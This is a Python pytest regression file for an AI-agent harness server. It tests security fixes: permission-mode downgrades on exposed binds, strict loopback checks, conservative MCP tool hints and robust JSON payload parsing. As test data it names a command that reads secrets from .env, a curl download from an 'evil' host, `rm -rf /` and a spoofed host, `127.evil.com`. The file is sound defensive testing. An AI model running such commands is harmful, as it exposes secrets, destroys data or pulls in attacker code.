"""审查缺陷回归测试（纯本地，零网络 / 零模型）。

覆盖 8 条 finding：
1. server：非本地绑定（HOST=0.0.0.0）时 auto_confirm 默认关闭，本地回环默认开启，env 可覆盖。
2. server：api_base 指向本地/回环时允许不带 key（免 key 部署不被误拒）。
3. server/frontend：/api/health 拆分 server_key_default 语义（前端据此给自带 key 引导）。
4. server：permission_mode 白名单校验，非法档回退 default。
5. mcp：上游声明的 hints 透传；未声明 hints 的未知工具按保守默认（destructiveHint=True）。
6. mcp：close() 回收子进程传输层，不再残留 unclosed transport。
7. mcp：call_tool 支持 server 名含 "__" 的路由解析。
8. session_memory：取首个「合法 JSON 对象」，跳过引言里的非对象花括号。
"""

from __future__ import annotations

import asyncio
import gc
import json
import os
import subprocess
import sys
import warnings
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from agents.mcp_client import (  # noqa: E402
    McpConnection,
    McpManager,
    _declared_hints,
)
from agents.session_memory import (  # noqa: E402
    _extract_json_text,
    _first_json_object,
    parse_folded_memory,
    parse_handover,
)

import server.app as app_module  # noqa: E402

client = TestClient(app_module.app)


# ─── finding 1：auto_confirm 默认值随绑定地址变化 ─────────────────


def _import_constants(env_extra: dict[str, str]) -> tuple[str, str]:
    """在子进程里以指定 env 导入 server.app，返回 (BIND_HOST, AUTO_CONFIRM)。

    W08 之后，hosted（对外绑定）模式未配置 EVOHARNESS_HOSTED_TOKEN 会拒绝启动。
    这些测试只关心 AUTO_CONFIRM 与绑定地址的关系，因此显式设置
    EVOHARNESS_ALLOW_UNAUTHED_HOSTED=1 跳过启动门（接受风险的内网部署形态），
    不弱化产品本身。
    """
    env = dict(os.environ)
    for key in (
        "EVOHARNESS_AUTO_CONFIRM",
        "EVOHARNESS_HOST",
        "HOST",
        "PORT",
        "EVOHARNESS_HOSTED_TOKEN",
        "EVOHARNESS_ALLOW_UNAUTHED_HOSTED",
    ):
        env.pop(key, None)
    env.update(env_extra)
    env.setdefault("EVOHARNESS_ALLOW_UNAUTHED_HOSTED", "1")
    code = "import server.app as a; print(a.BIND_HOST); print(a.AUTO_CONFIRM)"
    out = subprocess.run(
        [sys.executable, "-c", code], cwd=str(ROOT), env=env,
        capture_output=True, text=True,
    )
    assert out.returncode == 0, out.stderr
    lines = [ln.strip() for ln in out.stdout.strip().splitlines() if ln.strip()]
    return lines[-2], lines[-1]


def test_auto_confirm_defaults_off_for_nonlocal_bind():
    host, auto = _import_constants({"HOST": "0.0.0.0"})
    assert host == "0.0.0.0"
    assert auto == "False"


def test_auto_confirm_defaults_on_for_local_bind():
    host, auto = _import_constants({})
    assert host == "127.0.0.1"
    assert auto == "True"


def test_auto_confirm_env_override_wins():
    host, auto = _import_constants({"HOST": "0.0.0.0", "EVOHARNESS_AUTO_CONFIRM": "1"})
    assert host == "0.0.0.0"
    assert auto == "True"


def test_is_local_api_base():
    assert app_module._is_local_api_base("http://localhost:11434/v1")
    assert app_module._is_local_api_base("http://127.0.0.1:8000")
    assert app_module._is_local_api_base("http://[::1]:8000/v1")
    assert not app_module._is_local_api_base("https://llmapi.paratera.com/v1")
    assert not app_module._is_local_api_base("")
    assert not app_module._is_local_api_base(None)


# ─── finding 2：本地/回环 base 免 key ────────────────────────────


class _FakeAgent:
    current_turns = 1

    def get_token_usage(self) -> dict:
        return {}

    async def chat(self, message: str) -> None:
        return None


def test_local_base_without_key_not_rejected(monkeypatch):
    monkeypatch.setattr(
        app_module, "ALLOW_SERVER_KEY", False, raising=False
    )
    monkeypatch.setattr(app_module, "_get_agent", lambda *a, **k: _FakeAgent())
    resp = client.post("/api/chat", json={
        "session_id": "localkey",
        "message": "hi",
        "api_base": "http://localhost:11434/v1",
    })
    assert "未配置模型 API key" not in resp.text
    assert '"type": "start"' in resp.text or '"type":"start"' in resp.text


def test_remote_base_without_key_is_rejected(monkeypatch):
    monkeypatch.setattr(app_module, "ALLOW_SERVER_KEY", False, raising=False)
    resp = client.post("/api/chat", json={
        "session_id": "remotekey",
        "message": "hi",
        "api_base": "https://api.example.com/v1",
    })
    assert "未配置模型 API key" in resp.text
    assert "end" in resp.text


# ─── finding 3：health 语义拆分 ──────────────────────────────────


def test_health_exposes_server_key_default():
    data = client.get("/api/health").json()
    assert "server_key_default" in data
    assert isinstance(data["server_key_default"], bool)
    assert data["server_configured"] == bool(app_module.API_KEY)
    assert data["server_key_default"] == bool(app_module.ALLOW_SERVER_KEY and app_module.API_KEY)


# ─── finding 4：permission_mode 白名单 ──────────────────────────


def test_safe_permission_mode_whitelist():
    assert app_module._safe_permission_mode("plan") == "plan"
    assert app_module._safe_permission_mode("default") == "default"
    assert app_module._safe_permission_mode("acceptEdits") == "acceptEdits"
    assert app_module._safe_permission_mode("bypassPermissions") == "bypassPermissions"
    assert app_module._safe_permission_mode("dontAsk") == "dontAsk"
    assert app_module._safe_permission_mode("foo") == "default"
    assert app_module._safe_permission_mode("plan ") == "default"
    assert app_module._safe_permission_mode("Default") == "default"
    assert app_module._safe_permission_mode(None) == "default"


def test_chat_rejects_invalid_permission_mode_to_default(monkeypatch):
    captured: dict = {}

    def _capture(session_id, permission_mode, *a, **k):
        captured["mode"] = permission_mode
        return _FakeAgent()

    monkeypatch.setattr(app_module, "_get_agent", _capture)
    resp = client.post("/api/chat", json={
        "session_id": "permmode",
        "message": "hi",
        "permission_mode": "foo",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert resp.status_code == 200
    assert captured["mode"] == "default"


def test_chat_passes_valid_permission_mode(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(
        app_module, "_get_agent",
        lambda session_id, permission_mode, *a, **k: (
            captured.update({"mode": permission_mode}) or _FakeAgent()
        ),
    )
    client.post("/api/chat", json={
        "session_id": "permmode2",
        "message": "hi",
        "permission_mode": "plan",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert captured["mode"] == "plan"


# ─── finding 5：MCP hints 透传 + 未知工具保守默认 ─────────────────


def test_declared_hints_helper():
    assert _declared_hints(None) is None
    assert _declared_hints({}) is None
    assert _declared_hints({"note": "x"}) is None
    assert _declared_hints({"readOnlyHint": True}) == {"readOnlyHint": True}
    assert _declared_hints({"destructiveHint": False}) == {"destructiveHint": False}


def test_declared_hints_rejects_non_bool_values():
    """上游非布尔值（"false"/0/null）视为未声明，不得 bool() 强转成 True。"""
    assert _declared_hints({"readOnlyHint": "false"}) is None
    assert _declared_hints({"readOnlyHint": 0}) is None
    assert _declared_hints({"readOnlyHint": None}) is None
    assert _declared_hints({"readOnlyHint": True}) == {"readOnlyHint": True}
    assert _declared_hints({"readOnlyHint": False}) == {"readOnlyHint": False}
    # 混合：非布尔字段被忽略，仅保留真正的 bool。
    assert _declared_hints({"readOnlyHint": "false", "destructiveHint": True}) == {
        "destructiveHint": True
    }


def test_list_tools_exposes_declared_hints():
    conn = McpConnection("srv", sys.executable, [])

    async def fake_send(method, params=None):
        return {"tools": [
            {"name": "t", "annotations": {"destructiveHint": True}},
            {"name": "u"},
        ]}

    conn._send_request = fake_send  # type: ignore[assignment]
    tools = asyncio.run(conn.list_tools())
    by = {t["name"]: t["hints"] for t in tools}
    assert by["t"] == {"destructiveHint": True}
    assert by["u"] is None  # 未声明 → None（未知）


def test_unknown_mcp_tool_uses_conservative_hints():
    manager = McpManager()
    manager._tools = [
        {"name": "unknown_tool", "description": "", "inputSchema": None,
         "serverName": "srv", "hints": None},
        {"name": "ro_tool", "description": "", "inputSchema": None,
         "serverName": "srv", "hints": {"readOnlyHint": True}},
    ]
    by = {d["name"]: d["hints"] for d in manager.get_tool_definitions()}
    unknown = by["mcp__srv__unknown_tool"]
    assert unknown["readOnlyHint"] is False
    assert unknown["destructiveHint"] is True
    assert unknown["openWorldHint"] is True
    # 已声明 readOnlyHint 的工具保持声明值（不误报破坏性）。
    assert by["mcp__srv__ro_tool"]["readOnlyHint"] is True


# ─── finding 6：close() 回收传输层 ──────────────────────────────


def test_close_reclaims_transport_without_explicit_wait():
    with warnings.catch_warnings(record=True) as caught:
        warnings.simplefilter("always")

        async def scenario() -> None:
            conn = McpConnection("regression", sys.executable, ["-c", "import time; time.sleep(30)"])
            await conn.connect()
            conn.close()  # 不显式 await proc.wait()，模拟真实 disconnect 路径

        asyncio.run(scenario())
        gc.collect()

    resource_warnings = [w for w in caught if issubclass(w.category, ResourceWarning)]
    assert not resource_warnings, [str(w.message) for w in resource_warnings]


# ─── finding 7：call_tool 路由解析（server 名含 "__"） ────────────


def _make_fake_conn(captured: dict, name: str = ""):
    class _Conn:
        async def call_tool(self, tool, args):
            captured["tool"] = tool
            captured["name"] = name
            return "ok"
    return _Conn()


def test_call_tool_routes_dunder_server_name():
    manager = McpManager()
    captured: dict = {}
    manager._connections = {"a__b": _make_fake_conn(captured, "a__b")}
    out = asyncio.run(manager.call_tool("mcp__a__b__real_tool", {"x": 1}))
    assert out == "ok"
    assert captured["name"] == "a__b"
    assert captured["tool"] == "real_tool"


def test_call_tool_keeps_dunder_in_tool_name():
    manager = McpManager()
    captured: dict = {}
    manager._connections = {"filesystem": _make_fake_conn(captured, "filesystem")}
    asyncio.run(manager.call_tool("mcp__filesystem__read__file", {}))
    assert captured["name"] == "filesystem"
    assert captured["tool"] == "read__file"


def test_call_tool_unknown_server_raises():
    manager = McpManager()
    with pytest.raises(RuntimeError):
        asyncio.run(manager.call_tool("mcp__ghost__t", {}))


def test_call_tool_invalid_name_raises():
    manager = McpManager()
    with pytest.raises(ValueError):
        asyncio.run(manager.call_tool("not_prefixed", {}))


# ─── finding 8：首个合法 JSON 对象 ───────────────────────────────


def test_parse_folded_memory_skips_leading_non_object_braces():
    text = 'notion: use { } for sets. {"episode_memory":{"task_description":"real"}}'
    parsed = parse_folded_memory(text)
    assert parsed["episode_memory"]["task_description"] == "real"


def test_extract_json_text_skips_invalid_brace_candidate():
    text = 'use {1, 2} for sets. {"ok": true}'
    assert json.loads(_extract_json_text(text)) == {"ok": True}


def test_extract_json_text_empty_object_still_parses():
    assert json.loads(_extract_json_text("{}")) == {}
    assert json.loads(_extract_json_text("{ }")) == {}


def test_extract_json_text_prefers_nonempty_over_empty():
    text = '{} then {"a": 1}'
    assert json.loads(_extract_json_text(text)) == {"a": 1}


# ─── finding 9：部分声明的 hints 未声明字段取保守值 ────────────────


def test_partial_mcp_hints_fill_conservative_defaults():
    manager = McpManager()
    manager._tools = [
        {"name": "partial", "description": "", "inputSchema": None,
         "serverName": "srv", "hints": {"readOnlyHint": False}},
        {"name": "ro_true", "description": "", "inputSchema": None,
         "serverName": "srv", "hints": {"readOnlyHint": True}},
    ]
    by = {d["name"]: d["hints"] for d in manager.get_tool_definitions()}
    partial = by["mcp__srv__partial"]
    # 只声明 readOnlyHint=False 时，未声明字段一律保守（destructiveHint=True）。
    assert partial["readOnlyHint"] is False
    assert partial["destructiveHint"] is True
    assert partial["idempotentHint"] is False
    assert partial["openWorldHint"] is True
    # 已声明字段保持声明值。
    assert by["mcp__srv__ro_true"]["readOnlyHint"] is True


# ─── 复审 finding 11：readOnly 与 destructive hint 互斥（不得自相矛盾） ────────────


def test_readonly_mcp_tool_not_marked_destructive():
    """显式 readOnlyHint=True 的工具不得被补 destructiveHint=True（hint 自相矛盾）。"""
    manager = McpManager()
    manager._tools = [
        {"name": "ro_only", "description": "", "inputSchema": None,
         "serverName": "srv", "hints": {"readOnlyHint": True}},
        {"name": "ro_dec_dest", "description": "", "inputSchema": None,
         "serverName": "srv", "hints": {"readOnlyHint": True, "destructiveHint": True}},
    ]
    by = {d["name"]: d["hints"] for d in manager.get_tool_definitions()}
    ro = by["mcp__srv__ro_only"]
    assert ro["readOnlyHint"] is True
    assert ro["destructiveHint"] is False
    # 上游同时显式声明互斥值时，以 readOnly 为准，仍不产生自相矛盾 hint。
    both = by["mcp__srv__ro_dec_dest"]
    assert both["readOnlyHint"] is True
    assert both["destructiveHint"] is False


# ─── finding 10：多对象时优先取已知 payload 键的候选 ────────────────


def test_first_json_object_prefers_known_payload_over_prefix():
    text = (
        '{"note":"x"} '
        '{"episode_memory":{"task_description":"real"},'
        '"working_memory":{},"tool_memory":{}}'
    )
    parsed = parse_folded_memory(text)
    # 修复前首个（小前缀）对象被选中 → payload 静默丢失为空。
    assert parsed["episode_memory"]["task_description"] == "real"


def test_first_json_object_largest_when_no_known_keys():
    text = '{"small":1} then {"big":{"a":1,"b":2,"c":3}}'
    assert json.loads(_extract_json_text(text)) == {"big": {"a": 1, "b": 2, "c": 3}}


def test_first_json_object_prefers_distinguishing_keys_over_generic_prefix():
    # 引言小对象含通用键 artifacts（非区分性）：旧实现只认「首个含任一已知键」的候选，
    # 会抢占并静默丢弃真正含 conclusions 的 payload。现改为优先最具区分性的候选。
    text = (
        '{"artifacts":[],"why":"prefix"} '
        '{"conclusions":["real"],"artifacts":[],"constraints":[],"next_actions":[]}'
    )
    assert parse_handover(text)["conclusions"] == ["real"]


# ─── 复审 low：handover 区分键单一 + 空对象绕过 fallback ────────────


def test_first_json_object_prefers_filled_payload_over_longer_template_foreword():
    # 前言对象「更长且含全部已知键」但取值全空（模板/说明），真 payload 仅 conclusions 非空：
    # 旧排序（按已知键个数+长度）会让前言取胜、真结论静默丢失；现按「非空取值」判定真 payload。
    foreword = (
        '{"episode_memory":{},"working_memory":{},"tool_memory":{},'
        '"conclusions":[],"artifacts":[],"constraints":[],"next_actions":[]}'
    )
    real = '{"conclusions":["the real conclusion"],"artifacts":[],"constraints":[],"next_actions":[]}'
    text = "Schema reminder (ignore): " + foreword + "\nActual handover:\n" + real
    assert parse_handover(text)["conclusions"] == ["the real conclusion"]


def test_first_json_object_empty_object_not_returned_so_fallback_triggers():
    # 仅空对象时不返回该空对象：纯 '{}' 经原文回退仍可解析（兼容既有语义），
    # 而被非 JSON 散文包裹的空对象应解析失败，交由调用方走 fallback，而非静默成全空 payload。
    assert _first_json_object("prose {} prose") == ""
    assert json.loads(_extract_json_text("{}")) == {}
    with pytest.raises(ValueError):
        parse_handover("model produced no structured payload: {}")


# ─── 复审 finding 1：占位/schema 回显值的前言不得压过真 payload ──────


def test_first_json_object_prefers_real_payload_over_placeholder_foreword():
    # 前言对象含 schema 回显占位值（task_description="the task"、conclusions=["example"]），
    # 旧排序只看「非空取值个数/长度」→ 前言取胜、真 payload 静默取错（拿到 "example"）。
    text = (
        'rem {"episode_memory":{"task_description":"the task"},"conclusions":["example"]} '
        'real {"conclusions":["real"]}'
    )
    assert parse_handover(text)["conclusions"] == ["real"]
    # fold 场景同理：占位前言不得压过真 episode_memory。
    fold_text = (
        'schema echo {"episode_memory":{"task_description":"the task"},'
        '"working_memory":{},"tool_memory":{}} '
        'actual {"episode_memory":{"task_description":"fix the login bug"}}'
    )
    assert parse_folded_memory(fold_text)["episode_memory"]["task_description"] == "fix the login bug"


# ─── 复审 finding 1：禁止客户端 unconditional bypassPermissions ────


def test_gate_permission_mode_downgrades_bypass_without_auto_confirm():
    assert app_module._gate_permission_mode("bypassPermissions", False) == "default"
    assert app_module._gate_permission_mode("bypassPermissions", True) == "bypassPermissions"
    # 其它档不受影响
    assert app_module._gate_permission_mode("acceptEdits", False) == "acceptEdits"
    assert app_module._gate_permission_mode("plan", False) == "plan"
    assert app_module._gate_permission_mode("default", False) == "default"


def test_chat_downgrades_client_bypass_when_auto_confirm_off(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", False, raising=False)
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", False, raising=False)

    def _capture(session_id, permission_mode, *a, **k):
        captured["mode"] = permission_mode
        captured["auto"] = k.get("auto_confirm_enabled")
        return _FakeAgent()

    monkeypatch.setattr(app_module, "_get_agent", _capture)
    resp = client.post("/api/chat", json={
        "session_id": "bypassgate",
        "message": "hi",
        "permission_mode": "bypassPermissions",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert resp.status_code == 200
    # 不会自动批准时，客户端 bypassPermissions 被降级为最保守档
    assert captured["mode"] == "default"
    assert captured["auto"] is False


def test_chat_allows_client_bypass_when_auto_confirm_on(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", True, raising=False)
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", False, raising=False)
    monkeypatch.setattr(
        app_module, "_get_agent",
        lambda session_id, permission_mode, *a, **k: (
            captured.update({"mode": permission_mode}) or _FakeAgent()
        ),
    )
    client.post("/api/chat", json={
        "session_id": "bypassgate2",
        "message": "hi",
        "permission_mode": "bypassPermissions",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert captured["mode"] == "bypassPermissions"


# ─── 复审 finding 2：请求期按真实绑定地址修正 auto_confirm ──────────


def test_effective_auto_confirm_off_for_exposed_bind(monkeypatch):
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", False, raising=False)
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", True, raising=False)
    # 真实对外/通配绑定：即使 env 推导出 True，也强制关闭
    assert app_module._effective_auto_confirm(("0.0.0.0", 8800)) is False
    assert app_module._effective_auto_confirm(("::", 8800)) is False
    assert app_module._effective_auto_confirm(("192.168.1.10", 8800)) is False
    # 本地回环 / 无法判定的主机名：保持原值
    assert app_module._effective_auto_confirm(("127.0.0.1", 8800)) is True
    assert app_module._effective_auto_confirm(("testserver", 80)) is True
    assert app_module._effective_auto_confirm(None) is True


def test_effective_auto_confirm_env_override_wins(monkeypatch):
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", True, raising=False)
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", True, raising=False)
    assert app_module._effective_auto_confirm(("0.0.0.0", 8800)) is True


# ─── 复审 finding 3：严格回环匹配（拒绝 127.evil.com） ─────────────


def test_is_local_host_strict_loopback():
    assert app_module._is_local_host("127.0.0.1")
    assert app_module._is_local_host("127.255.255.254")
    assert app_module._is_local_host("localhost")
    assert app_module._is_local_host("::1")
    assert not app_module._is_local_host("127.evil.com")
    assert not app_module._is_local_host("127.0.0.1.evil.com")
    assert not app_module._is_local_host("10.0.0.1")
    assert not app_module._is_local_host("")
    assert not app_module._is_local_api_base("http://127.evil.com:8000/v1")


# ─── 复审 finding 4：health 区分「有额度」与「默认可用」 ─────────────


def test_health_distinguishes_configured_from_usable(monkeypatch):
    monkeypatch.setattr(app_module, "API_KEY", "sk-x", raising=False)
    monkeypatch.setattr(app_module, "ALLOW_SERVER_KEY", False, raising=False)
    d = client.get("/api/health").json()
    assert d["server_configured"] is True
    # 有额度但不默认回落：前端据此不应点亮「服务端可用」
    assert d["server_key_default"] is False
    monkeypatch.setattr(app_module, "ALLOW_SERVER_KEY", True, raising=False)
    assert client.get("/api/health").json()["server_key_default"] is True


# ─── 复审 finding 5：_get_agent 缓存命中须重应用 mode/auto_confirm ────────────


class _CacheAgent:
    """最小 Agent 替身：记录被重绑后的档位与确认回调。"""

    def __init__(self, fingerprint: tuple):
        self.permission_mode = "bypassPermissions"
        self._web_config = fingerprint
        self.session_id = ""
        self.confirm_fn = None
        self._plan_approval_fn = None

    def set_confirm_fn(self, fn) -> None:
        self.confirm_fn = fn

    def set_plan_approval_fn(self, fn) -> None:
        self._plan_approval_fn = fn


# 指纹用产品自己的函数构造（W07 起 key 用完整 SHA-256，不再允许手写旧格式）：
# 测试关注的是"同指纹命中缓存 + 档位重绑"，指纹格式本身由 test_web_lifecycle 固定。
_SAME_FP = app_module._config_fingerprint("https://api.example.com/v1", "k", "m1")


def test_get_agent_cache_hit_reapplies_downgrade_and_confirm_off(monkeypatch):
    monkeypatch.setattr(app_module, "ALLOW_SERVER_KEY", False, raising=False)
    fake = _CacheAgent(_SAME_FP)
    monkeypatch.setitem(app_module.AGENTS, "reuse_off", fake)

    out = app_module._get_agent(
        "reuse_off", "default", "https://api.example.com/v1", "k", "m1",
        auto_confirm_enabled=False,
    )
    # 复用同一对象，但请求期的档位降级必须重新应用（旧 bypassPermissions 不得保留）。
    assert out is fake
    assert fake.permission_mode == "default"
    # 未自动批准：工具确认回调必须拒绝。
    assert asyncio.run(fake.confirm_fn("rm -rf /")) is False


def test_get_agent_cache_hit_reapplies_confirm_on(monkeypatch):
    monkeypatch.setattr(app_module, "ALLOW_SERVER_KEY", False, raising=False)
    fake = _CacheAgent(_SAME_FP)
    fake.permission_mode = "default"
    monkeypatch.setitem(app_module.AGENTS, "reuse_on", fake)

    out = app_module._get_agent(
        "reuse_on", "bypassPermissions", "https://api.example.com/v1", "k", "m1",
        auto_confirm_enabled=True,
    )
    assert out is fake
    assert fake.permission_mode == "bypassPermissions"
    assert asyncio.run(fake.confirm_fn("x")) is True


# ─── 复审 finding：对外部署 + 关闭确认时 acceptEdits 也必须降级 ─────────────
# acceptEdits 是 ChatRequest 默认档：auto_confirm 关闭时它仍会让非黑名单 shell
# （如 `powershell -Command Get-Content .env`、`curl http://evil/x -o f`）跳过确认直接执行，
# 也可无确认写工作区文件，与 bypassPermissions 同等危险。

client_exposed = TestClient(app_module.app, base_url="http://0.0.0.0")


def test_gate_permission_mode_downgrades_accept_edits_only_for_exposed_bind():
    # 对外绑定 + 未自动批准 → acceptEdits 降级为更严的 dontAsk（禁 shell + 编辑写盘；
    # default 仍会无确认放行工作区内既有文件的写，不足以堵住对外裸写盘）。
    assert app_module._gate_permission_mode("acceptEdits", False, True) == "dontAsk"
    # 本地绑定（或显式开启确认）→ 不受影响
    assert app_module._gate_permission_mode("acceptEdits", False, False) == "acceptEdits"
    assert app_module._gate_permission_mode("acceptEdits", True, True) == "acceptEdits"
    # 对外绑定 + 未自动批准时 default 也降级为 dontAsk：否则 default 档对工作区内既有
    # 文件的 write_file/edit_file 不触发 confirm，等于无确认放行裸写盘；plan 档不受影响
    assert app_module._gate_permission_mode("default", False, True) == "dontAsk"
    assert app_module._gate_permission_mode("plan", False, True) == "plan"


# ─── 复审 finding：对外部署 + 关闭确认时 bypassPermissions 也必须降级到 dontAsk ──────
# bypass 若只降级到 default，default 档仍无确认放行工作区内既有文件的写（write_file/
# edit_file 指向已存在路径时不触发 confirm），对外等于留下裸写盘口子；应与 acceptEdits
# 一致降级到 dontAsk。


def test_gate_permission_mode_downgrades_bypass_to_dontask_for_exposed_bind():
    assert app_module._gate_permission_mode("bypassPermissions", False, True) == "dontAsk"
    # 本地回环仍降级到 default；显式开启自动批准则保持原档
    assert app_module._gate_permission_mode("bypassPermissions", False, False) == "default"
    assert app_module._gate_permission_mode("bypassPermissions", True, True) == "bypassPermissions"


def test_chat_downgrades_client_bypass_to_dontask_when_exposed_and_auto_confirm_off(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", False, raising=False)
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", False, raising=False)

    def _capture(session_id, permission_mode, *a, **k):
        captured["mode"] = permission_mode
        captured["auto"] = k.get("auto_confirm_enabled")
        return _FakeAgent()

    monkeypatch.setattr(app_module, "_get_agent", _capture)
    resp = client_exposed.post("/api/chat", json={
        "session_id": "bypassgate-exposed",
        "message": "hi",
        "permission_mode": "bypassPermissions",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert resp.status_code == 200
    # 对外绑定 + 不自动批准：客户端 bypassPermissions 降级为 dontAsk（编辑写盘/shell 走 deny）
    assert captured["mode"] == "dontAsk"
    assert captured["auto"] is False


def test_chat_downgrades_client_accept_edits_when_exposed_and_auto_confirm_off(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", False, raising=False)
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", False, raising=False)

    def _capture(session_id, permission_mode, *a, **k):
        captured["mode"] = permission_mode
        captured["auto"] = k.get("auto_confirm_enabled")
        return _FakeAgent()

    monkeypatch.setattr(app_module, "_get_agent", _capture)
    resp = client_exposed.post("/api/chat", json={
        "session_id": "accepteditsgate",
        "message": "hi",
        # ChatRequest 默认档即 acceptEdits：不再依赖客户端显式发 bypassPermissions
        "permission_mode": "acceptEdits",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert resp.status_code == 200
    # 对外绑定 + 不自动批准：客户端 acceptEdits 被降级为 dontAsk，shell/编辑写盘将走 deny
    assert captured["mode"] == "dontAsk"
    assert captured["auto"] is False


def test_chat_keeps_accept_edits_local_or_when_auto_confirm_on(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", False, raising=False)

    def _capture(session_id, permission_mode, *a, **k):
        captured["mode"] = permission_mode
        return _FakeAgent()

    monkeypatch.setattr(app_module, "_get_agent", _capture)
    # 1) 本地回环（TestClient 默认 host 'testserver' 无法判定为对外）→ 保持 acceptEdits
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", False, raising=False)
    client.post("/api/chat", json={
        "session_id": "acceptlocal",
        "message": "hi",
        "permission_mode": "acceptEdits",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert captured["mode"] == "acceptEdits"
    # 2) 对外绑定但显式开启自动批准 → 保持 acceptEdits
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", True, raising=False)
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", True, raising=False)
    client_exposed.post("/api/chat", json={
        "session_id": "acceptexposedon",
        "message": "hi",
        "permission_mode": "acceptEdits",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert captured["mode"] == "acceptEdits"


def test_chat_downgrades_client_default_to_dontask_when_exposed_and_auto_confirm_off(monkeypatch):
    captured: dict = {}
    monkeypatch.setattr(app_module, "AUTO_CONFIRM", False, raising=False)
    monkeypatch.setattr(app_module, "_AUTO_CONFIRM_EXPLICIT", False, raising=False)

    def _capture(session_id, permission_mode, *a, **k):
        captured["mode"] = permission_mode
        captured["auto"] = k.get("auto_confirm_enabled")
        return _FakeAgent()

    monkeypatch.setattr(app_module, "_get_agent", _capture)
    resp = client_exposed.post("/api/chat", json={
        "session_id": "defaultgate-exposed",
        "message": "hi",
        "permission_mode": "default",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert resp.status_code == 200
    # Exposed bind + no auto-confirm: explicit client "default" downgraded to dontAsk.
    assert captured["mode"] == "dontAsk"
    assert captured["auto"] is False
    resp = client_exposed.post("/api/chat", json={
        "session_id": "defaultgate-exposed2",
        "message": "hi",
        "permission_mode": "foo",
        "api_key": "k",
        "api_base": "https://api.example.com/v1",
    })
    assert resp.status_code == 200
    # Invalid value falls back to "default" (_safe_permission_mode) then downgrades likewise.
    assert captured["mode"] == "dontAsk"

# ─── 复审 finding 1（二）：schema 描述串回显的前言在两种语序下都不得压过真 payload ─


_FOLD_SCHEMA_ECHO_FOREWORD = {
    "episode_memory": {
        "task_description": "overall task and user intent",
        "key_events": [
            {"step": "short label or number", "description": "what happened",
             "outcome": "result or observation"},
        ],
        "current_progress": "what is complete and what remains",
    },
    "working_memory": {
        "immediate_goal": "current subgoal",
        "current_challenges": "active blockers, risks, or uncertainty",
        "next_actions": [
            {"type": "tool_call/planning/decision", "description": "concrete next action"},
        ],
    },
    "tool_memory": {
        "tools_used": [
            {"tool_name": "tool name",
             "effective_parameters": ["important arguments or paths"],
             "common_errors": ["errors, denials, or failed attempts"],
             "response_pattern": "what the tool returned",
             "experience": "lesson for continuing this task"},
        ],
        "derived_rules": ["rules for using tools or avoiding repeated mistakes"],
    },
}


def test_first_json_object_prefers_real_payload_over_schema_descriptor_foreword():
    # 前言把 FOLD 自带的 schema 描述串当取值原样回显（不是占位列表里的 'the task'，而是
    # 'overall task and user intent'/'current subgoal' 等说明文本）。旧识别过窄 → 前言取值
    # 被判真实、且对象更长 → 两种语序下都压过真 payload，fold 真状态静默丢失。
    foreword = json.dumps(_FOLD_SCHEMA_ECHO_FOREWORD, ensure_ascii=False)
    real = json.dumps(
        {"episode_memory": {"task_description": "fix the login bug", "key_events": [],
                            "current_progress": "done"}},
        ensure_ascii=False,
    )
    assert parse_folded_memory("Schema to fill:\n" + foreword + "\nActual memory:\n" + real)[
        "episode_memory"]["task_description"] == "fix the login bug"
    # 真 payload 在前、schema 回显在后的语序同样必须命中真 payload。
    assert parse_folded_memory(real + "\n\nSchema echo:\n" + foreword)[
        "episode_memory"]["task_description"] == "fix the login bug"


def test_first_json_object_prefers_real_payload_over_handover_schema_echo():
    foreword = json.dumps({
        "conclusions": ["conclusion of the finished stage, one string each; include verified "
                        "AND refuted intermediate results (mark refuted results as refuted so "
                        "they are not retried)"],
        "artifacts": [{"path": "absolute or repo-relative path",
                       "why": "one line: why this artifact matters for the next stage"}],
        "constraints": ["user constraints, approvals, or denials that still bind the next stage"],
        "next_actions": [{"type": "tool_call/planning/decision",
                          "description": "the single concrete next action"}],
    }, ensure_ascii=False)
    real = json.dumps({"conclusions": ["the real conclusion"], "artifacts": [],
                       "constraints": [], "next_actions": []}, ensure_ascii=False)
    assert parse_handover("Schema:\n" + foreword + "\nActual:\n" + real)[
        "conclusions"] == ["the real conclusion"]
    assert parse_handover(real + "\n" + foreword)["conclusions"] == ["the real conclusion"]


def test_real_value_with_ellipsis_not_treated_as_placeholder():
    # 真实字段里合法出现的省略号不得被当成占位标记（旧实现 '...' 参与子串匹配）。
    from agents.session_memory import _looks_placeholder
    assert _looks_placeholder("fix the bug ... then run the tests", "task_description") is False
    # 整体就是 '...' 的取值仍算占位。
    assert _looks_placeholder("...", "task_description") is True
